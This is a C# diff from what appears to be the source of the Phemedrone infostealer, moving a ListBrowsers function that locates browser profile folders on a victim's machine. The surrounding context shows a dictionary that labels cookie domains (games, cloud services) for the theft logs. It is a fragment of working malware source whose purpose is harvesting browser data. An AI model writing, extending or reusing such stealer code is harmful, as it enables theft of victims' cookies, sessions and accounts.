@@ -80,6 +80,41 @@ namespace Phemedrone.Extensions
             return content;
         }
 
+        public static List<string> ListBrowsers(string rootLocation, Func<string, bool> performCheck)
+        {
+            var browserLocations = new List<string>();
+            var currentLocations = new List<string>
+            {
+                rootLocation
+            };
+            for (var depth = 0; depth < 2; depth++)
+            {
+                var newLocations = new List<string>();
+                foreach (var directory in currentLocations.SelectMany(Directory.GetDirectories))
+                {
+                    try
+                    {
+                        if (performCheck(directory))
+                        {
+                            browserLocations.Add(directory);
+                            continue;
+                        }
+
+                        if (Directory.GetFiles(directory).Length > 0) continue;
+                        newLocations.Add(directory);
+                    }
+                    catch
+                    {
+                        // ignored bc it's basically unauthorized access exception
+                    }
+                }
+
+                currentLocations = newLocations;
+            }
+
+            return browserLocations;
+        }
+        
         private static Dictionary<string, string> _tags = new() // you can add tag example: {"domain", "TAG IN LOG"}
         {
             {"roblox.com", "GAMES"},
@@ -140,41 +175,6 @@ namespace Phemedrone.Extensions
             {"mega.io", "CLOUD"},
             {"cloud.google.com", "CLOUD"}
         };
-
-        public static List<string> ListBrowsers(string rootLocation, Func<string, bool> performCheck)
-        {
-            var browserLocations = new List<string>();
-            var currentLocations = new List<string>
-            {
-                rootLocation
-            };
-            for (var depth = 0; depth < 2; depth++)
-            {
-                var newLocations = new List<string>();
-                foreach (var directory in currentLocations.SelectMany(Directory.GetDirectories))
-                {
-                    try
-                    {
-                        if (performCheck(directory))
-                        {
-                            browserLocations.Add(directory);
-                            continue;
-                        }
-
-                        if (Directory.GetFiles(directory).Length > 0) continue;
-                        newLocations.Add(directory);
-                    }
-                    catch
-                    {
-                        // ignored bc it's basically unauthorized access exception
-                    }
-                }
-
-                currentLocations = newLocations;
-            }
-
-            return browserLocations;
-        }
 
         public static void CookiesTags(string url)
         {
